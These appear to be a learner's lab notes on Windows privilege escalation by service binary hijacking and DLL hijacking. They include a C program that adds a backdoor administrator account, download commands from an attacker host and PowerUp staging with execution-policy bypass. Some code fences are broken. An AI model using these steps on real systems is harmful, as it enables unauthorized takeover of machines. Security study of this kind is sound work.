> A Windows Service is a long-running background executable or application managed by the Service Control Manager and is similar to the concept of daemons on Unix systems.
> Windows services can be managed by the Services snap-in, PowerShell, or the **sc.exe** command line tool.
> Windows uses the LocalSystem (includes the SIDs of NT AUTHORITY\SYSTEM and BUILTIN\Administrators in its token), Network Service, and Local Service user accounts to run its own services.
> Users or programs creating a service can choose either one of those accounts, a domain user, or a local user.

# Service Binary Hijacking

### Scenario
Software developer creates a program and installs an application as a Windows service.
During the installation, the developer does not secure the permissions of the program, allowing full Read and Write access to all members of the Users group.
As a result, a lower-privileged user could replace the program with a malicious one.
To execute the replaced binary, the user can restart the service or, in case the service is configured to start automatically, reboot the machine.
Once the service is restarted, the malicious binary will be executed with the privileges of the service, such as _LocalSystem_.

	...
```

List of services running *not* in `c:\windows\system32` path
```powershell
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {($_.State -like 'Running') -and ($_.PathName -notlike 'C:\Windows\system32\*')}
	Name          State   PathName

```

These services/ binaries stand out as they're not running from the System32 path.
- Means they're user-installed and the software developer is in charge of the directory structure as well as permissions of the software

To enumerate the binary's permissions, use **icacls**.

Will output the current principles and their permission mask:

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

```powershell
PS C:\Users\dave> icacls "c:\xampp\apache\bin\httpd.exe"
	c:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
	                              NT AUTHORITY\SYSTEM:(F)
	                              BUILTIN\Users:(RX)
	                              NT AUTHORITY\Authenticated Users:(RX)


PS C:\Users\dave> icacls "c:\xampp\mysql\bin\mysqld.exe"
	c:\xampp\mysql\bin\mysqld.exe BUILTIN\Administrators:(F)
	                              NT AUTHORITY\SYSTEM:(F)
	                              BUILTIN\Users:(F)
```
	- httpd service - users have read and execute access
	- mysqld service - users have full access - allows us to write & modify (aka replace) the file

Create binary to replace
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  i = system ("net localgroup 'Remote Desktop Users' dave2 /add");
  
  return 0;
}
```
	- Will add a new user *dave2* with password *password123!*
	- Add new user to Administrators group
	- Will add new user to RDP group

Cross-compile & start a python server
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

python3 -m http.server 80
```

Download to victim machine and replace mysqld.exe
```powershell
PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

As most services are only managed by administrative users, we won't have permission to stop/ restart it.

However, If the service _Startup Type_ is set to "Automatic", we may be able to restart the service by rebooting the machine.
- Check start mode
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
	Name  StartMode
	----  ---------
	mysql Auto
```

- Check user's privileges for reboot
```powershell
PS C:\Users\dave> whoami /priv
	PRIVILEGES INFORMATION
	----------------------
	
	Privilege Name                Description                          State
	============================= ==================================== ========
	SeSecurityPrivilege           Manage auditing and security log     Disabled
	SeShutdownPrivilege           Shut down the system                 Disabled     #<-- NOTE
	SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
	SeUndockPrivilege             Remove computer from docking station Disabled
	SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
	SeTimeZonePrivilege           Change the time zone                 Disabled
```

> The _Disabled_ state only indicates if the privilege is currently enabled for the running process. In our case, it means that whoami has not requested and is not currently using the *SeShutdownPrivilege* privilege.

- Issue a reboot
```powershell
shutdown /r /t 0
```

Can verify it worked by RDP'ing back in as `dave` and check
```powershell
PS C:\Users\dave> Get-LocalGroupMember administrators

	ObjectClass Name                      PrincipalSource
	----------- ----                      ---------------
	User        CLIENTWK220\Administrator Local
	User        CLIENTWK220\BackupAdmin   Local
	User        CLIENTWK220\dave2         Local
	User        CLIENTWK220\daveadmin     Local
	User        CLIENTWK220\offsec        Local
```

Will now need to switch over to new user `dave2` AND start a powershell terminal using Admin privs
```powershell
# Switch to new user
PS C:\Users\dave> runAs /user:dave2 powershell.exe

# Open PowerShell 'As Admin'
PS C:\Windows\system32> Start-Process powershell.exe -Verb runAs
```

## Automated PowerUp.ps1

- Stage PowerUp.ps1 tool
```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```

- Download on victim and run
```powershell
PS C:\Users\dave> iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

PS C:\Users\dave> powershell -ep bypass

PS C:\Users\dave>  . .\PowerUp.ps1

# Service DLL Hijacking

Without proper perms to abuse service binary hijacking, we can attempt to hijack a service's DLL load.

*Dynamic Link Libraries* provide functionality to programs or the OS.
- Contain code or resources (like icon files), for other executable files or objects to use.
- Provide a way for developers to use and integrate already existing functionality w/o 'reinventing the wheel' (think python libraries)
- Used to store functionality . by several components.
- Called *Shared Objects* on Unix systems

Several methods we can use:
- Overwrite a DLL the service binary uses
	- Though, service may not work as expected as the original DLL's functionality is missing
		- Most cases, still can lead to code execution
- Hijack the DLL *search order*
	- Defined by MS & determines what to inspect first when searching for DLLs.

> By default, all current Win versions have 'safe DLL search mode' enabled
> 	Implemented due to the high number of DLL hijacking vectors and ensures that DLLs are more difficult to hijack

#### Standard DLL search order
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

> When Safe DLL Search Mode is disabled, the current directory (5 above) is searched at position 2 - right after the app's dir

#### Exploitation
Due to either a flawed installation process or updates, a DLL is missing, and the binary attempts to load the DLL which doesn't exist on the system.

To exploit, place a malicious DLL (with the name of the missing DLL) in a path of the Search Order so it executes when the binary is started.

- Start by enumerating the services and check permissions on these files
```powershell
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {($_.State -like 'Running') -and ($_.PathName -notlike 'C:\windows\system32\*')}

	Name          State   PathName
	----          -----   --------
	Apache2.4     Running "C:\xampp\apache\bin\httpd.exe" -k runservice
	BetaService   Running C:\Users\steve\Documents\BetaServ.exe
	edgeupdate    Running "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
	LSM           Running
	mysql         Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
	uhssvc        Running "C:\Program Files\Microsoft Update Health Tools\uhssvc.exe"
	VGAuthService Running "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
	VMTools       Running "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
	WinDefend     Running "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MsMpEng.exe"
```

- Check permissions on the binary file
```powershell
PS C:\Users\steve> icacls .\Documents\BetaServ.exe
	.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
		 BUILTIN\Administrators:(F)
		 CLIENTWK220\steve:(RX)
		 CLIENTWK220\offsec:(F)
```

- Start up Procmon to observe any calls to missing DLLs
	- (**procmon64.exe** is in the C:\\tools\\procmon\\ directory)
- Add filter for service
	- Add > Apply > Ok
![](procmon_filter.png)

- Restart the service to capture processes
```powershell
PS C:\Users\steve> Restart-Service BetaService
	WARNING: Waiting for service 'BetaService (BetaService)' to start...
```

> Can add filters to narrow down further:
	1. Operation - Contains - Reg - then - Include
	2. Result - Is - NAME NOT FOUND - then - Include
